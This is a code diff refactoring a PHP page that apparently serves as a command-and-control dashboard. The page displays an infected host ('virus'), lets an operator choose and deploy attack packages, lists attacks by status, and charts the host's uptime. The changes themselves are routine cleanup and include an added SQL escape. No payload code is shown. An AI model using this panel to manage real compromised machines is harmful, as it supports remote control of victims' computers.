@@ -1,7 +1,5 @@
 <?php
 
-/** @noinspection PhpUnusedParameterInspection */
-
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\AttackFactory;
 use Kelvinho\Virus\Attack\PackageRegistrar;
@@ -15,7 +13,7 @@ use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\map;
 use function Kelvinho\Virus\niceFileSize;
 
-global $mysqli, $timezone, $session, $userFactory, $virusFactory, $attackFactory, $authenticator, $demos;
+global $mysqli, $timezone, $session, $userFactory, $virusFactory, $attackFactory, $authenticator, $demos, $packageRegistrar;
 
 /** @var PackageRegistrar $packageRegistrar */
 
@@ -27,13 +25,11 @@ global $mysqli, $timezone, $session, $userFactory, $virusFactory, $attackFactory
  * @param AttackFactory $attackFactory
  * @param User $user
  * @param PackageRegistrar $packageRegistrar
- * @param string $virus_id
  * @param Timezone $timezoneObject
  */
-function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar, string $virus_id, Timezone $timezoneObject) {
-    if (count($attack_ids) === 0) { ?>
-        <p>(No attacks)</p>
-    <?php } else { ?>
+function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar, Timezone $timezoneObject) {
+    if (count($attack_ids) === 0) echo "<p>(No attacks)</p>";
+    else { ?>
         <div style="overflow: auto;" class="w3-card table-round">
             <table class="w3-table w3-bordered w3-hoverable">
                 <tr class="w3-white table-heads"><?php
@@ -46,9 +42,7 @@ function displayTable(array $attack_ids, array $visibleFields, AttackFactory $at
                 </tr>
                 <?php foreach ($attack_ids as $attack_id) {
                     $attack = $attackFactory->get($attack_id);
-                    echo "<tr onclick = \"redirect('$attack_id')\" style=\"cursor: pointer;\">";
-                    //echo "<tr>";
-                    //echo "<a href='" . DOMAIN . "/ctrls/viewVirus?vrs=$virus_id&aks=$attack_id'>";
+                    echo "<tr onclick = \"redirect(event, '$attack_id')\" style=\"cursor: pointer;\">";
                     echo in_array(0, $visibleFields) ? "<td>" . $attack->getName() . "</td>" : "";
                     echo in_array(1, $visibleFields) ? "<td>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</td>" : "";
                     echo in_array(2, $visibleFields) ? "<td>" . formattedHash($attack->getAttackId()) . "</td>" : "";
@@ -63,14 +57,13 @@ function displayTable(array $attack_ids, array $visibleFields, AttackFactory $at
 }
 
 if (!$session->has("virus_id")) Header::redirectToHome();
-$virus_id = $session->getCheck("virus_id");
-if (!$authenticator->authorized($virus_id)) Header::redirectToHome();
+if (!$authenticator->authorized($virus_id = $session->getCheck("virus_id"))) Header::redirectToHome();
 
 $virus = $virusFactory->get($virus_id);
-$user = $userFactory->get($session->get("user_handle")); ?>
+$user = $userFactory->currentChecked(); ?>
 <html lang="en_US">
 <head>
-    <title>Virus info</title>
+    <title><?php echo $virus->getName(); ?> - Virs</title>
     <?php HtmlTemplate::header($user->isDarkMode()); ?>
     <style>
         .w3-table td {
@@ -162,31 +155,26 @@ HtmlTemplate::body(); ?>
     <!--suppress HtmlFormInputWithoutLabel -->
     <select id="attackPackage" class="w3-select w3-col l10 m9 s8" name="option" style="padding: 8px;">
         <option value="" disabled selected>Choose attack package</option>
-        <?php map($packageRegistrar->getPackages(), function ($package) use ($packageRegistrar) { ?>
-            <option value="<?php echo "$package"; ?>"><?php echo $packageRegistrar->getDisplayName($package); ?></option>
-        <?php }); ?>
+        <?php echo implode(map($packageRegistrar->getPackages(), fn($dbName) => "<option value='$dbName'>" . $packageRegistrar->getDisplayName($dbName) . "</option>")); ?>
     </select>
     <div style="padding-left: 8px;" class="w3-col l2 m3 s4">
         <button class="w3-btn w3-block w3-red" onclick="continueAttack()">Continue</button>
     </div>
 </div>
-<?php map($packageRegistrar->getPackages(), function ($dbName) use ($packageRegistrar) { ?>
-    <p id="packageDescription-<?php echo $dbName; ?>" class="packageDescriptions">Package
-        description: <?php echo $packageRegistrar->getDescription($dbName); ?></p>
-<?php }); ?>
+<?php echo implode(map($packageRegistrar->getPackages(), fn($dbName) => "<p id='packageDescription-$dbName' class='packageDescriptions' style='display: none'>Package description: " . $packageRegistrar->getDescription($dbName) . "</p>")); ?>
 <div id="message" style="color: red;"></div>
 <h2>Background attacks</h2>
 <h3>Offline</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $timezone); ?>
 <h3>Online</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $timezone); ?>
 <h2>One time attacks</h2>
 <h3>Dormant attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $timezone); ?>
 <h3>Deployed attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $timezone); ?>
 <h3>Executed attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId(), $timezone); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar, $timezone); ?>
 <h2>How to attack?</h2>
 <?php $demos->renderVirusHowTo(); ?>
 <h2>Which package?</h2>
@@ -196,27 +184,18 @@ HtmlTemplate::body(); ?>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/chart.js@2.9.3/dist/Chart.min.js"></script>
 <script type="application/javascript">
     const gui = {
-        packageDescriptions: $(".packageDescriptions"),
-        message: $("#message"),
-        attackName: $("#attackName"),
-        attackPackage: $("#attackPackage")
+        packageDescriptions: $(".packageDescriptions"), message: $("#message"),
+        attackName: $("#attackName"), attackPackage: $("#attackPackage")
     };
 
     function updateVirus() {
         $.ajax({
-            url: "<?php echo DOMAIN_CONTROLLER; ?>/updateVirus",
-            type: "POST",
-            data: {
-                virus_id: "<?php echo $virus_id; ?>",
-                name: $("#name").val(),
-                profile: $("#profile").val()
-            },
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/updateVirus", type: "POST",
+            data: {virus_id: "<?php echo $virus_id; ?>", name: $("#name").val(), profile: $("#profile").val()},
             success: () => window.location = "<?php echo DOMAIN . "/ctrls/viewVirus?vrs=$virus_id"; ?>",
             error: () => toast.displayOfflineMessage("Can't update virus.")
         });
     }
-
-    gui.packageDescriptions.css("display", "none");
 
     gui.attackPackage.change(function () {
         const packageDbName = gui.attackPackage.val();
@@ -231,13 +210,8 @@ HtmlTemplate::body(); ?>
         if (attackName.length > 50) return toast.display("Message name should be less than 50 characters");
         if (attackName === "") attackName = "(not set)";
         $.ajax({
-            url: "<?php echo DOMAIN_CONTROLLER . "/newAttack"; ?>",
-            type: "POST",
-            data: {
-                virus_id: <?php echo "\"$virus_id\""; ?>,
-                attack_package: gui.attackPackage.val(),
-                name: attackName
-            },
+            url: "<?php echo DOMAIN_CONTROLLER . "/newAttack"; ?>", type: "POST",
+            data: {virus_id: <?php echo "\"$virus_id\""; ?>, attack_package: gui.attackPackage.val(), name: attackName},
             success: () => window.location = "<?php echo DOMAIN . "/attack"; ?>",
             error: () => toast.displayOfflineMessage("Can't create a new attack.")
         });
@@ -255,13 +229,9 @@ HtmlTemplate::body(); ?>
         });
     }
 
-    let ctrlIsPressed = false;
-    $(document).keydown(event => (event.which === 17 ? (ctrlIsPressed = true) : 0));
-    $(document).keyup(() => ctrlIsPressed = false);
-
-    function redirect(attack_id) {
+    function redirect(event, attack_id) {
         if (clickHold) return clickHold = false;
-        if (ctrlIsPressed) window.open("<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id, "_blank");
+        if (event.ctrlKey) window.open("<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id, "_blank");
         else window.location = "<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id;
     }
 
@@ -273,13 +243,12 @@ HtmlTemplate::body(); ?>
 
     $uptimes = []; // [{"unix_time" => ..., "active" => 0}, ...]
     {
-        if (!$answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"$virus_id\" order by unix_time")) return [];
+        if (!$answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"" . $mysqli->escape_string($virus_id) . "\" order by unix_time")) return [];
         while ($row = $answer->fetch_assoc()) $uptimes[] = ["unix_time" => (int)$row["unix_time"], "active" => (int)$row["activeI"]];
     }
 
     function getHoursPerHourSlice(\Kelvinho\Virus\Singleton\Generator $uptimeGenerator, int $startTime, int $days) {
-        $cyclesPerHour = 12; // 5 minutes per cycle
-        $cycleDuration = 3600 / $cyclesPerHour; // in seconds
+        $cycleDuration = 3600 / ($cyclesPerHour = 12); // in seconds
         $data = Torch::zeros(24); // string hour_interval => int hours
         // check over all 5 minute intervals. If analysis time is greater than next uptime in question, then update next uptime
         if (($uptime = $uptimeGenerator->next()) !== null) {
@@ -306,15 +275,10 @@ HtmlTemplate::body(); ?>
      * @return array the graphable array
      */
     function getDailyTimes(array $uptimes, int $timezoneOffset, int $startTime = -1) {
-        if ($startTime === -1) $startTime = time() - 24 * 3600;
-        $startTime = strtotime(date("Y-m-d H:00:00", $startTime));
-        $endTime = $startTime + 24 * 3600;
+        $endTime = ($startTime = strtotime(date("Y-m-d H:00:00", ($startTime === -1) ? time() - 24 * 3600 : $startTime))) + 24 * 3600;
         // filtering out the uptimes that are not in the 1 day period
         $startState = 0; // the initial state just before the start time
-        foreach ($uptimes as $uptime) {
-            if ($startTime < $uptime["unix_time"]) break;
-            $startState = $uptime["active"];
-        }
+        foreach ($uptimes as $uptime) if ($startTime < $uptime["unix_time"]) break; else $startState = $uptime["active"];
         $uptimes = filter($uptimes, fn($el) => $startTime < $el["unix_time"] && $endTime > $el["unix_time"]);
         array_unshift($uptimes, ["unix_time" => $startTime - 1, "active" => $startState]);
         $uptimes[] = ["unix_time" => $endTime];
@@ -330,8 +294,7 @@ HtmlTemplate::body(); ?>
     $timezoneOffset = $timezone->getOffset($user->getTimezone());
 
     function getMonthlyTimes(array $uptimes, int $timezoneOffset) {
-        $endTime = time();
-        $startTime = strtotime(date("Y-m-d H:00:00", $endTime - 30 * 24 * 3600));
+        $startTime = strtotime(date("Y-m-d H:00:00", ($endTime = time()) - 30 * 24 * 3600));
         // filtering out the uptimes that are more than 1 month away
         $uptimes = filter($uptimes, fn($el) => $startTime < $el["unix_time"]);
         $uptimes[] = ["unix_time" => $endTime, "active" => 1];
@@ -343,22 +306,14 @@ HtmlTemplate::body(); ?>
 
     ?>
     const days = <?php echo "[" . join(", ", map(Torch::reverse(Torch::range(14, 1)), function ($daysBack) use ($uptimes, $timezoneOffset) {
-            $startTime = time() - $daysBack * 24 * 3600;
-            $graphableDaily = getDailyTimes(Torch::clone($uptimes), $timezoneOffset, $startTime);
-            return "{labels: " . json_encode($graphableDaily["labels"]) . ", " .
-                "data: " . json_encode($graphableDaily["data"]) . ", " .
+            $graphableDaily = getDailyTimes(Torch::clone($uptimes), $timezoneOffset, $startTime = time() - $daysBack * 24 * 3600);
+            return "{labels: " . json_encode($graphableDaily["labels"]) . ", data: " . json_encode($graphableDaily["data"]) . ", " .
                 "title: \"" . date("M j", $startTime) . " - " . date("M j", $startTime + 24 * 3600) . "\"}";
-        })) . "];";
-
-        ?>
+        })) . "];"; ?>
 
         chartColors = {
-            red: 'rgb(255, 99, 132)',
-            orange: 'rgb(255, 159, 64)',
-            yellow: 'rgb(255, 205, 86)',
-            green: 'rgb(75, 192, 192)',
-            blue: 'rgb(54, 162, 235)',
-            purple: 'rgb(153, 102, 255)',
+            red: 'rgb(255, 99, 132)', orange: 'rgb(255, 159, 64)', yellow: 'rgb(255, 205, 86)',
+            green: 'rgb(75, 192, 192)', blue: 'rgb(54, 162, 235)', purple: 'rgb(153, 102, 255)',
             grey: 'rgb(201, 203, 207)'
         };
 
@@ -386,8 +341,7 @@ HtmlTemplate::body(); ?>
                     scaleLabel: {display: true, labelString: '% Hour'},
                     ticks: {beginAtZero: true, max: 100}, gridLines: {color: gridColor}
                 }],
-            },
-            animation: {duration: 500}
+            }, animation: {duration: 500}
         }
     });
 
@@ -422,6 +376,6 @@ HtmlTemplate::body(); ?>
         }
     });
 
-    autoAdjustHeight($('#profile'))
+    autoAdjustHeight($('#profile'));
 </script>
 </html>
